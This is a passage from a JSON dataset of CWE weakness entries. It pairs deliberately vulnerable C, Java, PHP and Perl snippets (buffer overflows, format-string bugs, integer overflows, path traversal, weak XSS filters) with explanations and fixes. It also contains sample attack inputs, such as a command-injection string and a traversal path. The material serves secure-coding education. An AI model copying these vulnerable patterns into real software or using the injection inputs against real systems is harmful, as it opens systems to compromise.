the buffer and the message size is placed into an array using the message number for the array index. (bad code) Example Language: C /* capture the sizes of all messages */ int getsizes(int sock, int count, int *sizes) { ... char buf[BUFFER_SIZE]; int ok; int num, size; // read values from socket and added to sizes array while ((ok = gen_recv(sock, buf, sizeof(buf))) == 0) { \"// continue read from socket until buf only contains '.'\" if (DOTLINE(buf)) break; else if (sscanf(buf, \"%d %d\", &num, &size) == 2) sizes[num - 1] = size; } ... } In this example the message number retrieved from the buffer could be a value that is outside the allowable range of indices for the array and could possibly be a negative number. Without proper validation of the value to be used for the array index an array overflow could occur and could potentially lead to unauthorized access to memory addresses and system crashes. The value of the array index should be validated to ensure that it is within the allowable range of indices for the array as in the following code. (good code) Example Language: C /* capture the sizes of all messages */ int getsizes(int sock, int count, int *sizes) { ... char buf[BUFFER_SIZE]; int ok; int num, size; // read values from socket and added to sizes array while ((ok = gen_recv(sock, buf, sizeof(buf))) == 0) { \"// continue read from socket until buf only contains '.'\" if (DOTLINE(buf)) break; else if (sscanf(buf, \"%d %d\", &num, &size) == 2) { if (num > 0 && num <= (unsigned)count) sizes[num - 1] = size; else /* warn about possible attempt to induce buffer overflow */ report(stderr, \"Warning: ignoring bogus data for message sizes returned by server.\\\\n\"); } } ... } Example 5 In the following example the method displayProductSummary is called from a Web service servlet to retrieve product summary information for display to the user. The servlet obtains the integer value of the product number from the user and passes it to the displayProductSummary method. The displayProductSummary method passes the integer value of the product number to the getProductSummary method which obtains the product summary from the array object containing the project summaries using the integer value of the product number as the array index. (bad code) Example Language: Java // Method called from servlet to obtain product information public String displayProductSummary(int index) { String productSummary = new String(\"\"); try { String productSummary = getProductSummary(index); } catch (Exception ex) {...} return productSummary; } public String getProductSummary(int index) { return products[index]; } In this example the integer value used as the array index that is provided by the user may be outside the allowable range of indices for the array which may provide unexpected results or cause the application to fail. The integer value used for the array index should be validated to ensure that it is within the allowable range of indices for the array as in the following code. (good code) Example Language: Java // Method called from servlet to obtain product information public String displayProductSummary(int index) { String productSummary = new String(\"\"); try { String productSummary = getProductSummary(index); } catch (Exception ex) {...} return productSummary; } public String getProductSummary(int index) { String productSummary = \"\"; if ((index >= 0) && (index < MAX_PRODUCTS)) { productSummary = products[index]; } else { System.err.println(\"index is out of bounds\"); throw new IndexOutOfBoundsException(); } return productSummary; } An alternative in Java would be to use one of the collection objects such as ArrayList that will automatically generate an exception if an attempt is made to access an array index that is out of bounds. (good code) Example Language: Java ArrayList productArray = new ArrayList(MAX_PRODUCTS); ... try { productSummary = (String) productArray.get(index); } catch (IndexOutOfBoundsException ex) {...} Example 6 The following example asks a user for an offset into an array to select an item. (bad code) Example Language: C int main (int argc, char **argv) { char *items[] = {\"boat\", \"car\", \"truck\", \"train\"}; int index = GetUntrustedOffset(); printf(\"You selected %s\\\\n\", items[index-1]); } The programmer allows the user to specify which element in the list to select, however an attacker can provide an out-of-bounds offset, resulting in a buffer over-read ( CWE-126 )."
    },
    {
        "id": 130,
        "demonstrative_examples": "Example 1 In the following C/C++ example the method processMessageFromSocket() will get a message from a socket, placed into a buffer, and will parse the contents of the buffer into a structure that contains the message length and the message body. A for loop is used to copy the message body into a local character string which will be passed to another method for processing. (bad code) Example Language: C int processMessageFromSocket(int socket) { int success; char buffer[BUFFER_SIZE]; char message[MESSAGE_SIZE]; // get message from socket and store into buffer //Ignoring possibliity that buffer > BUFFER_SIZE if (getMessage(socket, buffer, BUFFER_SIZE) > 0) { // place contents of the buffer into message structure ExMessage *msg = recastBuffer(buffer); // copy message body into string for processing int index; for (index = 0; index < msg->msgLength; index++) { message[index] = msg->msgBody[index]; } \"message[index] = '\\\\0';\" // process message success = processMessage(message); } return success; } However, the message length variable from the structure is used as the condition for ending the for loop without validating that the message length variable accurately reflects the length of the message body ( CWE-606 ). This can result in a buffer over-read ( CWE-125 ) by reading from memory beyond the bounds of the buffer if the message length variable indicates a length that is longer than the size of a message body ( CWE-130 )."
    },
    {
        "id": 131,
        "demonstrative_examples": "Example 1 The following code allocates memory for a maximum number of widgets. It then gets a user-specified number of widgets, making sure that the user does not request too many. It then initializes the elements of the array using InitializeWidget(). Because the number of widgets can vary for each request, the code inserts a NULL pointer to signify the location of the last widget. (bad code) Example Language: C int i; unsigned int numWidgets; Widget **WidgetList; numWidgets = GetUntrustedSizeValue(); if ((numWidgets == 0) || (numWidgets > MAX_NUM_WIDGETS)) { ExitError(\"Incorrect number of widgets requested!\"); } WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget *)); printf(\"WidgetList ptr=%p\\\\n\", WidgetList); for(i=0; i<numWidgets; i++) { WidgetList[i] = InitializeWidget(); } WidgetList[numWidgets] = NULL; showWidgets(WidgetList); However, this code contains an off-by-one calculation error ( CWE-193 ). It allocates exactly enough space to contain the specified number of widgets, but it does not include the space for the NULL pointer. As a result, the allocated buffer is smaller than it is supposed to be ( CWE-131 ). So if the user ever requests MAX_NUM_WIDGETS, there is an out-of-bounds write ( CWE-787 ) when the NULL is assigned. Depending on the environment and compilation settings, this could cause memory corruption. Example 2 The following image processing code allocates a table for images. (bad code) Example Language: C img_t table_ptr; /*struct containing img data, 10kB each*/ int num_imgs; ... num_imgs = get_num_imgs(); table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs); ... This code intends to allocate a table of size num_imgs, however as num_imgs grows large, the calculation determining the size of the list will eventually overflow ( CWE-190 ). This will result in a very small list to be allocated instead. If the subsequent code operates on the list as if it were num_imgs long, it may result in many types of out-of-bounds problems ( CWE-119 ). Example 3 This example applies an encoding procedure to an input string and stores it into a buffer. (bad code) Example Language: C char * copy_input(char *user_supplied_string){ int i, dst_index; char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE); if ( MAX_SIZE <= strlen(user_supplied_string) ){ die(\"user string too long, die evil hacker!\"); } dst_index = 0; for ( i = 0; i < strlen(user_supplied_string); i++ ){ \"if( '&' == user_supplied_string[i] ){\" \"dst_buf[dst_index++] = '&';\" \"dst_buf[dst_index++] = 'a';\" \"dst_buf[dst_index++] = 'm';\" \"dst_buf[dst_index++] = 'p';\" \"dst_buf[dst_index++] = ';';\" } \"else if ('<' == user_supplied_string[i] ){\" /* encode to &lt; */ } else dst_buf[dst_index++] = user_supplied_string[i]; } return dst_buf; } The programmer attempts to encode the ampersand character in the user-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands. Example 4 The following code is intended to read an incoming packet from a socket and extract one or more headers. (bad code) Example Language: C DataPacket *packet; int numHeaders; PacketHeader *headers; sock=AcceptSocketConnection(); ReadPacket(packet, sock); numHeaders =packet->headers; if (numHeaders > 100) { ExitError(\"too many headers!\"); } headers = malloc(numHeaders * sizeof(PacketHeader); ParsePacketHeaders(packet, headers); The code performs a check to make sure that the packet does not contain too many headers. However, numHeaders is defined as a signed int, so it could be negative. If the incoming packet specifies a value such as -3, then the malloc calculation will generate a negative number (say, -300 if each header can be a maximum of 100 bytes). When this result is provided to malloc(), it is first converted to a size_t type. This conversion then produces a large value such as 4294966996, which may cause malloc() to fail or to allocate an extremely large amount of memory ( CWE-195 ). With the appropriate negative numbers, an attacker could trick malloc() into using a very small positive number, which then allocates a buffer that is much smaller than expected, potentially leading to a buffer overflow. Example 5 The following code attempts to save three different identification numbers into an array. The array is allocated from memory using a call to malloc(). (bad code) Example Language: C int *id_sequence; /* Allocate space for an array of three ids. */ id_sequence = (int*) malloc(3); if (id_sequence == NULL) exit(1); /* Populate the id array. */ id_sequence[0] = 13579; id_sequence[1] = 24680; id_sequence[2] = 97531; \"The problem with the code above is the value of the size parameter used during the malloc() call. It uses a value of '3' which by definition results in a buffer of three bytes to be created. However the intention was to create a buffer that holds three ints, and in C, each int requires 4 bytes worth of memory, so an array of 12 bytes is needed, 4 bytes for each int. Executing the above code could result in a buffer overflow as 12 bytes of data is being saved into 3 bytes worth of allocated space. The overflow would occur during the assignment of id_sequence[0] and would continue with the assignment of id_sequence[1] and id_sequence[2].\" \"The malloc() call could have used '3*sizeof(int)' as the value for the size parameter in order to allocate the correct amount of space required to store the three ints.\""
    },
    {
        "id": 134,
        "demonstrative_examples": "Example 1 The following program prints a string provided as an argument. (bad code) Example Language: C #include <stdio.h> void printWrapper(char *string) { printf(string); } int main(int argc, char **argv) { char buf[5012]; memcpy(buf, argv[1], 5012); printWrapper(argv[1]); return (0); } The example is exploitable, because of the call to printf() in the printWrapper() function. Note: The stack buffer was added to make exploitation more simple. Example 2 The following code copies a command line argument into a buffer using snprintf(). (bad code) Example Language: C int main(int argc, char **argv){ char buf[128]; ... snprintf(buf,128,argv[1]); } This code allows an attacker to view the contents of the stack and write to the stack using a command line argument containing a sequence of formatting directives. The attacker can read from the stack by providing more formatting directives, such as %x, than the function takes as arguments to be formatted. (In this example, the function takes no arguments to be formatted.) By using the %n formatting directive, the attacker can write to the stack, causing snprintf() to write the number of bytes output thus far to the specified argument (rather than reading a value from the argument, which is the intended behavior). A sophisticated version of this attack will use four staggered writes to completely control the value of a pointer on the stack. Example 3 Certain implementations make more advanced attacks even easier by providing format directives that control the location in memory to read from or write to. An example of these directives is shown in the following code, written for glibc: (bad code) Example Language: C printf(\"%d %d %1$d %1$d\\\\n\", 5, 9); This code produces the following output: 5 9 5 5 It is also possible to use half-writes (%hn) to accurately control arbitrary DWORDS in memory, which greatly reduces the complexity needed to execute an attack that would otherwise require four staggered writes, such as the one mentioned in the first example."
    },
    {
        "id": 135,
        "demonstrative_examples": "Example 1 The following example would be exploitable if any of the commented incorrect malloc calls were used. (bad code) Example Language: C #include <stdio.h> #include <strings.h> #include <wchar.h> int main() { wchar_t wideString[] = L\"The spazzy orange tiger jumped \" \\\\ \"over the tawny jaguar.\"; wchar_t *newString; printf(\"Strlen() output: %d\\\\nWcslen() output: %d\\\\n\", strlen(wideString), wcslen(wideString)); \"/* Wrong because the number of chars in a string isn't related to its length in bytes //\" newString = (wchar_t *) malloc(strlen(wideString)); */ \"/* Wrong because wide characters aren't 1 byte long! //\" newString = (wchar_t *) malloc(wcslen(wideString)); */ /* Wrong because wcslen does not include the terminating null */ newString = (wchar_t *) malloc(wcslen(wideString) * sizeof(wchar_t)); /* correct! */ newString = (wchar_t *) malloc((wcslen(wideString) + 1) * sizeof(wchar_t)); /* ... */ } The output from the printf() statement would be: (result) Strlen() output: 0 Wcslen() output: 53"
    },
    {
        "id": 138,
        "demonstrative_examples": ""
    },
    {
        "id": 140,
        "demonstrative_examples": ""
    },
    {
        "id": 141,
        "demonstrative_examples": ""
    },
    {
        "id": 142,
        "demonstrative_examples": ""
    },
    {
        "id": 143,
        "demonstrative_examples": ""
    },
    {
        "id": 144,
        "demonstrative_examples": ""
    },
    {
        "id": 145,
        "demonstrative_examples": ""
    },
    {
        "id": 146,
        "demonstrative_examples": ""
    },
    {
        "id": 147,
        "demonstrative_examples": ""
    },
    {
        "id": 148,
        "demonstrative_examples": ""
    },
    {
        "id": 149,
        "demonstrative_examples": ""
    },
    {
        "id": 150,
        "demonstrative_examples": ""
    },
    {
        "id": 151,
        "demonstrative_examples": ""
    },
    {
        "id": 152,
        "demonstrative_examples": ""
    },
    {
        "id": 153,
        "demonstrative_examples": ""
    },
    {
        "id": 154,
        "demonstrative_examples": ""
    },
    {
        "id": 155,
        "demonstrative_examples": ""
    },
    {
        "id": 156,
        "demonstrative_examples": ""
    },
    {
        "id": 157,
        "demonstrative_examples": ""
    },
    {
        "id": 158,
        "demonstrative_examples": ""
    },
    {
        "id": 159,
        "demonstrative_examples": ""
    },
    {
        "id": 160,
        "demonstrative_examples": ""
    },
    {
        "id": 161,
        "demonstrative_examples": ""
    },
    {
        "id": 162,
        "demonstrative_examples": ""
    },
    {
        "id": 163,
        "demonstrative_examples": ""
    },
    {
        "id": 164,
        "demonstrative_examples": ""
    },
    {
        "id": 165,
        "demonstrative_examples": ""
    },
    {
        "id": 166,
        "demonstrative_examples": ""
    },
    {
        "id": 167,
        "demonstrative_examples": ""
    },
    {
        "id": 168,
        "demonstrative_examples": ""
    },
    {
        "id": 170,
        "demonstrative_examples": "Example 1 The following code reads from cfgfile and copies the input into inputbuf using strcpy(). The code mistakenly assumes that inputbuf will always contain a NULL terminator. (bad code) Example Language: C #define MAXLEN 1024 ... char *pathbuf[MAXLEN]; ... read(cfgfile,inputbuf,MAXLEN); //does not null terminate strcpy(pathbuf,inputbuf); //requires null terminated input ... The code above will behave correctly if the data read from cfgfile is null terminated on disk as expected. But if an attacker is able to modify this input so that it does not contain the expected NULL character, the call to strcpy() will continue copying from memory until it encounters an arbitrary NULL character. This will likely overflow the destination buffer and, if the attacker can control the contents of memory immediately following inputbuf, can leave the application susceptible to a buffer overflow attack. Example 2 In the following code, readlink() expands the name of a symbolic link stored in pathname and puts the absolute path into buf. The length of the resulting value is then calculated using strlen(). (bad code) Example Language: C char buf[MAXPATH]; ... readlink(pathname, buf, MAXPATH); int length = strlen(buf); ... The code above will not always behave correctly as readlink() does not append a NULL byte to buf. Readlink() will stop copying characters once the maximum size of buf has been reached to avoid overflowing the buffer, this will leave the value buf not NULL terminated. In this situation, strlen() will continue traversing memory until it encounters an arbitrary NULL character further on down the stack, resulting in a length value that is much larger than the size of string. Readlink() does return the number of bytes copied, but when this return value is the same as stated buf size (in this case MAXPATH), it is impossible to know whether the pathname is precisely that many bytes long, or whether readlink() has truncated the name to avoid overrunning the buffer. In testing, vulnerabilities like this one might not be caught because the unused contents of buf and the memory immediately following it may be NULL, thereby causing strlen() to appear as if it is behaving correctly. Example 3 While the following example is not exploitable, it provides a good example of how nulls can be omitted or misplaced, even when \"safe\" functions are used: (bad code) Example Language: C #include <stdio.h> #include <string.h> int main() { char longString[] = \"String signifying nothing\"; char shortString[16]; strncpy(shortString, longString, 16); printf(\"The last character in shortString is: %c (%1$x)\\\\n\", shortString[15]); return (0); } The above code gives the following output: \"The last character in shortString is: n (6e)\". So, the shortString array does not end in a NULL character, even though the \"safe\" string function strncpy() was used. The reason is that strncpy() does not impliciitly add a NULL character at the end of the string when the source is equal in length or longer than the provided size."
    },
    {
        "id": 172,
        "demonstrative_examples": ""
    },
    {
        "id": 173,
        "demonstrative_examples": ""
    },
    {
        "id": 174,
        "demonstrative_examples": ""
    },
    {
        "id": 175,
        "demonstrative_examples": ""
    },
    {
        "id": 176,
        "demonstrative_examples": "Example 1 Windows provides the MultiByteToWideChar(), WideCharToMultiByte(), UnicodeToBytes(), and BytesToUnicode() functions to convert between arbitrary multibyte (usually ANSI) character strings and Unicode (wide character) strings. The size arguments to these functions are specified in different units, (one in bytes, the other in characters) making their use prone to error. In a multibyte character string, each character occupies a varying number of bytes, and therefore the size of such strings is most easily specified as a total number of bytes. In Unicode, however, characters are always a fixed size, and string lengths are typically given by the number of characters they contain. Mistakenly specifying the wrong units in a size argument can lead to a buffer overflow. The following function takes a username specified as a multibyte string and a pointer to a structure for user information and populates the structure with information about the specified user. Since Windows authentication uses Unicode for usernames, the username argument is first converted from a multibyte string to a Unicode string. (bad code) Example Language: C void getUserInfo(char *username, struct _USER_INFO_2 info){ WCHAR unicodeUser[UNLEN+1]; MultiByteToWideChar(CP_ACP, 0, username, -1, unicodeUser, sizeof(unicodeUser)); NetUserGetInfo(NULL, unicodeUser, 2, (LPBYTE *)&info); } This function incorrectly passes the size of unicodeUser in bytes instead of characters. The call to MultiByteToWideChar() can therefore write up to (UNLEN+1)*sizeof(WCHAR) wide characters, or (UNLEN+1)*sizeof(WCHAR)*sizeof(WCHAR) bytes, to the unicodeUser array, which has only (UNLEN+1)*sizeof(WCHAR) bytes allocated. If the username string contains more than UNLEN characters, the call to MultiByteToWideChar() will overflow the buffer unicodeUser."
    },
    {
        "id": 177,
        "demonstrative_examples": ""
    },
    {
        "id": 178,
        "demonstrative_examples": "Example 1 In the following example, an XSS neutralization method intends to replace script tags in user-supplied input with a safe equivalent: (bad code) Example Language: Java public String preventXSS(String input, String mask) { return input.replaceAll(\"script\", mask); } The code only works when the \"script\" tag is in all lower-case, forming an incomplete denylist ( CWE-184 ). Equivalent tags such as \"SCRIPT\" or \"ScRiPt\" will not be neutralized by this method, allowing an XSS attack."
    },
    {
        "id": 179,
        "demonstrative_examples": "Example 1 The following code attempts to validate a given input path by checking it against an allowlist and then return the canonical path. In this specific case, the path is considered valid if it starts with the string \"/safe_dir/\". (bad code) Example Language: Java String path = getInputPath(); if (path.startsWith(\"/safe_dir/\")) { File f = new File(path); return f.getCanonicalPath(); } The problem with the above code is that the validation step occurs before canonicalization occurs. An attacker could provide an input path of \"/safe_dir/../\" that would pass the validation step. However, the canonicalization process sees the double dot as a traversal to the parent directory and hence when canonicized the path would become just \"/\". To avoid this problem, validation should occur after canonicalization takes place. In this case canonicalization occurs during the initialization of the File object. The code below fixes the issue. (good code) Example Language: Java String path = getInputPath(); File f = new File(path); if (f.getCanonicalPath().startsWith(\"/safe_dir/\")) { return f.getCanonicalPath(); } Example 2 This script creates a subdirectory within a user directory and sets the user as the owner. (bad code) Example Language: PHP function createDir($userName,$dirName){ \"$userDir = '/users/'. $userName;\" \"if(strpos($dirName,'..') !== false){\" \"echo 'Directory name contains invalid sequence';\" return; } \"//filter out '~' because other scripts identify user directories by this prefix\" \"$dirName = str_replace('~','',$dirName);\" $newDir = $userDir . $dirName; mkdir($newDir, 0700); chown($newDir,$userName); } While the script attempts to screen for \\'..\\' sequences, an attacker can submit a directory path including \".~.\", which will then become \"..\" after the filtering step. This allows a Path Traversal ( CWE-21 ) attack to occur."
    },
    {
        "id": 180,
        "demonstrative_examples": "Example 1 The following code attempts to validate a given input path by checking it against an allowlist and then return the canonical path. In this specific case, the path is considered valid if it starts with the string \"/safe_dir/\". (bad code) Example Language: Java String path = getInputPath(); if (path.startsWith(\"/safe_dir/\")) { File f = new File(path); return f.getCanonicalPath(); } The problem with the above code is that the validation step occurs before canonicalization occurs. An attacker could provide an input path of \"/safe_dir/../\" that would pass the validation step. However, the canonicalization process sees the double dot as a traversal to the parent directory and hence when canonicized the path would become just \"/\". To avoid this problem, validation should occur after canonicalization takes place. In this case canonicalization occurs during the initialization of the File object. The code below fixes the issue. (good code) Example Language: Java String path = getInputPath(); File f = new File(path); if (f.getCanonicalPath().startsWith(\"/safe_dir/\")) { return f.getCanonicalPath(); }"
    },
    {
        "id": 181,
        "demonstrative_examples": "Example 1 This script creates a subdirectory within a user directory and sets the user as the owner. (bad code) Example Language: PHP function createDir($userName,$dirName){ \"$userDir = '/users/'. $userName;\" \"if(strpos($dirName,'..') !== false){\" \"echo 'Directory name contains invalid sequence';\" return; } \"//filter out '~' because other scripts identify user directories by this prefix\" \"$dirName = str_replace('~','',$dirName);\" $newDir = $userDir . $dirName; mkdir($newDir, 0700); chown($newDir,$userName); } While the script attempts to screen for \\'..\\' sequences, an attacker can submit a directory path including \".~.\", which will then become \"..\" after the filtering step. This allows a Path Traversal ( CWE-21 ) attack to occur."
    },
    {
        "id": 182,
        "demonstrative_examples": ""
    },
    {
        "id": 183,
        "demonstrative_examples": ""
    },
    {
        "id": 184,
        "demonstrative_examples": "Example 1 The following code attempts to stop XSS attacks by removing all occurences of \"script\" in an input string. (bad code) Example Language: Java public String removeScriptTags(String input, String mask) { return input.replaceAll(\"script\", mask); } Because the code only checks for the lower-case \"script\" string, it can be easily defeated with upper-case script tags."
    },
    {
        "id": 185,
        "demonstrative_examples": "Example 1 The following code takes phone numbers as input, and uses a regular expression to reject invalid phone numbers. (bad code) Example Language: Perl $phone = GetPhoneNumber(); if ($phone =~ /\\\\d+-\\\\d+/) { # looks like it only has hyphens and digits system(\"lookup-phone $phone\"); } else { error(\"malformed number!\"); } An attacker could provide an argument such as: \"; ls -l ; echo 123-456\" This would pass the check, since \"123-456\" is sufficient to match the \"\\\\d+-\\\\d+\" portion of the regular expression."
    },
    {
        "id": 186,
        "demonstrative_examples": ""
    },
    {
        "id": 187,
        "demonstrative_examples": "Example 1 This example defines a fixed username and password. The AuthenticateUser() function is intended to accept a username and a password from an untrusted user, and check to ensure that it matches the username and password. If the username and password match, AuthenticateUser() is intended to indicate that authentication succeeded. (bad code) Example Language: C /* Ignore CWE-259 (hard-coded password) and CWE-309 (use of password system for authentication) for this example. */ char *username = \"admin\"; char *pass = \"password\"; int AuthenticateUser(char *inUser, char *inPass) { if (strncmp(username, inUser, strlen(inUser))) { logEvent(\"Auth failure of username using strlen of inUser\"); return(AUTH_FAIL); } if (! strncmp(pass, inPass, strlen(inPass))) { logEvent(\"Auth success of password using strlen of inUser\"); return(AUTH_SUCCESS); } else { logEvent(\"Auth fail of password using sizeof\"); return(AUTH_FAIL); } } int main (int argc, char **argv) { int authResult; if (argc < 3) { ExitError(\"Usage: Provide a username and password\"); } authResult = AuthenticateUser(argv[1], argv[2]); if (authResult == AUTH_SUCCESS) { DoAuthenticatedTask(argv[1]); } else { ExitError(\"Authentication failed\"); } } \"In AuthenticateUser(), the strncmp() call uses the string length of an attacker-provided inPass parameter in order to determine how many characters to check in the password. So, if the attacker only provides a password of length 1, the check will only examine the first byte of the application's password before determining success.\" As a result, this partial comparison leads to improper authentication ( CWE-287 ). Any of these passwords would still cause authentication to succeed for the \"admin\" user: (attack code) p pa pas pass This significantly reduces the search space for an attacker, making brute force attacks more feasible. The same problem also applies to the username, so values such as \"a\" and \"adm\" will succeed for the username. While this demonstrative example may not seem realistic, see the Observed Examples for CVE entries that effectively reflect this same weakness."
    },
    {
        "id": 188,
        "demonstrative_examples": "Example 1 In this example function, the memory address of variable b is derived by adding 1 to the address of variable a. This derived address is then used to assign the value 0 to b. (bad code) Example Language: C void example() { char a; char b; *(&a + 1) = 0; } Here, b may not be one byte past a. It may be one byte in front of a. Or, they may have three bytes between them because they are aligned on 32-bit boundaries."
    },
    {
        "id": 190,
        "demonstrative_examples": "Example 1 The following image processing code allocates a table for images. (bad code) Example Language: C img_t table_ptr; /*struct containing img data, 10kB each*/ int num_imgs; ... num_imgs = get_num_imgs(); table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs); ... This code intends to allocate a table of size num_imgs, however as num_imgs grows large, the calculation determining the size of the list will eventually overflow ( CWE-190 ). This will result in a very small list to be allocated instead. If the subsequent code operates on the list as if it were num_imgs long, it may result in many types of out-of-bounds problems ( CWE-119 ). Example 2 The following code excerpt from OpenSSH 3.3 demonstrates a classic case of integer overflow: (bad code) Example Language: C nresp = packet_get_int(); if (nresp > 0) { response = xmalloc(nresp*sizeof(char*)); for (i = 0; i < nresp; i++) response[i] = packet_get_string(NULL); } If nresp has the value 1073741824 and sizeof(char*) has its typical value of 4, then the result of the operation nresp*sizeof(char*) overflows, and the argument to xmalloc() will be 0. Most malloc() implementations will happily allocate a 0-byte buffer, causing the subsequent loop iterations to overflow the heap buffer response. Example 3 Integer overflows can be complicated and difficult to detect. The following example is an attempt to show how an integer overflow may lead to undefined looping behavior: (bad code) Example Language: C short int bytesRec = 0; char buf[SOMEBIGNUM]; while(bytesRec < MAXGET) { bytesRec += getFromInput(buf+bytesRec); } In the above case, it is entirely possible that bytesRec may overflow, continuously creating a lower number than MAXGET and also overwriting the first MAXGET-1 bytes of buf. Example 4 In this example the method determineFirstQuarterRevenue is used to determine the first quarter revenue for an accounting/business application. The method retrieves the monthly sales totals for the first three months of the year, calculates the first quarter sales totals from the monthly sales totals, calculates the first quarter revenue based on the first quarter sales, and finally saves the first quarter revenue results to the database. (bad code) Example Language: C #define JAN 1 #define FEB 2 #define MAR 3 short getMonthlySales(int month) {...} float calculateRevenueForQuarter(short quarterSold) {...} int determineFirstQuarterRevenue() { // Variable for sales revenue for the quarter float quarterRevenue = 0.0f; short JanSold = getMonthlySales(JAN); /* Get sales in January */ short FebSold = getMonthlySales(FEB); /* Get sales in February */ short MarSold = getMonthlySales(MAR); /* Get sales in March */ // Calculate quarterly total short quarterSold = JanSold + FebSold + MarSold; // Calculate the total revenue for the quarter quarterRevenue = calculateRevenueForQuarter(quarterSold); saveFirstQuarterRevenue(quarterRevenue); return 0; } However, in this example the primitive type short int is used for both the monthly and the quarterly sales variables. In C the short int primitive type has a maximum value of 32768. This creates a potential integer overflow if the value for the three monthly sales adds up to more than the maximum value for the short int primitive type. An integer overflow can lead to data corruption, unexpected behavior, infinite loops and system crashes. To correct the situation the appropriate primitive type should be used, as in the example below, and/or provide some validation mechanism to ensure that the maximum value for the primitive type is not exceeded. (good code) Example Language: C ... float calculateRevenueForQuarter(long quarterSold) {...} int determineFirstQuarterRevenue() { ... // Calculate quarterly total long quarterSold = JanSold + FebSold + MarSold; // Calculate the total revenue for the quarter quarterRevenue = calculateRevenueForQuarter(quarterSold); ... } Note that an integer overflow could also occur if the quarterSold variable has a primitive type long but the method calculateRevenueForQuarter has a parameter of type short."
    },
    {
        "id": 191,
        "demonstrative_examples": "Example 1 The following example subtracts from a 32 bit signed integer. (bad code) Example Language: C #include <stdio.h> #include <stdbool.h> main (void) { int i; i = -2147483648; i = i - 1; return 0; } The example has an integer underflow. The value of i is already at the lowest negative value possible, so after subtracting 1, the new value of i is 2147483647. Example 2 This code performs a stack allocation based on a length calculation. (bad code) Example Language: C int a = 5, b = 6; size_t len = a - b; char buf[len];    // Just blows up the stack } Since a and b are declared as signed ints, the \"a - b\" subtraction gives a negative result (-1). However, since len is declared to be unsigned, len is cast to an extremely large positive number (on 32-bit systems - 4294967295). As a result, the buffer buf[len] declaration uses an extremely large size to allocate on the stack, very likely more than the entire computer\\'s memory space. \"Miscalculations usually will not be so obvious. The calculation will either be complicated or the result of an attacker's input to attain the negative value.\""
    },
    {
        "id": 192,
        "demonstrative_examples": "Example 1 The following code is intended to read an incoming packet from a socket and extract one or more headers. (bad code) Example Language: C DataPacket *packet; int numHeaders; PacketHeader *headers; sock=AcceptSocketConnection(); ReadPacket(packet, sock); numHeaders =packet->headers; if (numHeaders > 100) { ExitError(\"too many headers!\"); } headers = malloc(numHeaders * sizeof(PacketHeader); ParsePacketHeaders(packet, headers); The code performs a check to make sure that the packet does not contain too many headers. However, numHeaders is defined as a signed int, so it could be negative. If the incoming packet specifies a value such as -3, then the malloc calculation will generate a negative number (say, -300 if each header can be a maximum of 100 bytes). When this result is provided to malloc(), it is first converted to a size_t type. This conversion then produces a large value such as 4294966996, which may cause malloc() to fail or to allocate an extremely large amount of memory ( CWE-195 ). With the appropriate negative numbers, an attacker could trick malloc() into using a very small positive number, which then allocates a buffer that is much smaller than expected, potentially leading to a buffer overflow. Example 2 The following code reads a maximum size and performs validation on that size. It then performs a strncpy, assuming it will not exceed the boundaries of the array. While the use of \"short s\" is forced in this particular example, short int\\'s are frequently used within real-world code, such as code that processes structured data. (bad code) Example Language: C int GetUntrustedInt () { return(0x0000FFFF); } void main (int argc, char **argv) { char path[256]; char *input; int i; short s; unsigned int sz; i = GetUntrustedInt(); s = i; /* s is -1 so it passes the safety check - CWE-697 */ if (s > 256) { DiePainfully(\"go away!\\\\n\"); } /* s is sign-extended and saved in sz */ sz = s; /* output: i=65535, s=-1, sz=4294967295 - your mileage may vary */ printf(\"i=%d, s=%d, sz=%u\\\\n\", i, s, sz); input = GetUserInput(\"Enter pathname:\"); \"/* strncpy interprets s as unsigned int, so it's treated as MAX_INT\" ( CWE-195 ), enabling buffer overflow ( CWE-119 ) */ strncpy(path, input, s); \"path[255] = '\\\\0'; /* don't want\" CWE-170 */ printf(\"Path is: %s\\\\n\", path); } This code first exhibits an example of CWE-839 , allowing \"s\" to be a negative number. When the negative short \"s\" is converted to an unsigned integer, it becomes an extremely large positive integer. When this converted integer is used by strncpy() it will lead to a buffer overflow ( CWE-119 )."
    },
    {
        "id": 193,
        "demonstrative_examples": "Example 1 The following code allocates memory for a maximum number of widgets. It then gets a user-specified number of widgets, making sure that the user does not request too many. It then initializes the elements of the array using InitializeWidget(). Because the number of widgets can vary for each request, the code inserts a NULL pointer to signify the location of the last widget. (bad code) Example Language: C int i; unsigned int numWidgets; Widget **WidgetList; numWidgets = GetUntrustedSizeValue(); if ((numWidgets == 0) || (numWidgets > MAX_NUM_WIDGETS)) { ExitError(\"Incorrect number of widgets requested!\"); } WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget *)); printf(\"WidgetList ptr=%p\\\\n\", WidgetList); for(i=0; i<numWidgets; i++) { WidgetList[i] = InitializeWidget(); } WidgetList[numWidgets] = NULL; showWidgets(WidgetList); However, this code contains an off-by-one calculation error ( CWE-193 ). It allocates exactly enough space to contain the specified number of widgets, but it does not include the space for the NULL pointer. As a result, the allocated buffer is smaller than it is supposed to be ( CWE-131 ). So if the user ever requests MAX_NUM_WIDGETS, there is an out-of-bounds write ( CWE-787 ) when the NULL is assigned. Depending on the environment and compilation settings, this could cause memory corruption. Example 2 In this example, the code does not account for the terminating null character, and it writes one byte beyond the end of the buffer. The first call to strncat() appends up to 20 characters plus a terminating null character to fullname[]. There is plenty of allocated space for this, and there is no weakness associated with this first call. However, the second call to strncat() potentially appends another 20 characters. The code does not account for the terminating null character that is automatically added by strncat(). This terminating null character would be written one byte beyond the end of the fullname[] buffer. Therefore an off-by-one error exists with the second strncat() call, as the third argument should be 19. (bad code) Example Language: C char firstname[20]; char lastname[20]; char fullname[40]; \"fullname[0] = '\\\\0';\" strncat(fullname, firstname, 20); strncat(fullname, lastname, 20); When using a function like strncat() one must leave a free byte at the end of the buffer for a terminating null character, thus avoiding the off-by-one weakness. Additionally, the last argument to strncat() is the number of characters to append, which must be less than the remaining space in the buffer. Be careful not to just use the total size of the buffer. (good code) Example Language: C char firstname[20]; char lastname[20]; char fullname[40]; \"fullname[0] = '\\\\0';\" strncat(fullname, firstname, sizeof(fullname)-strlen(fullname)-1); strncat(fullname, lastname, 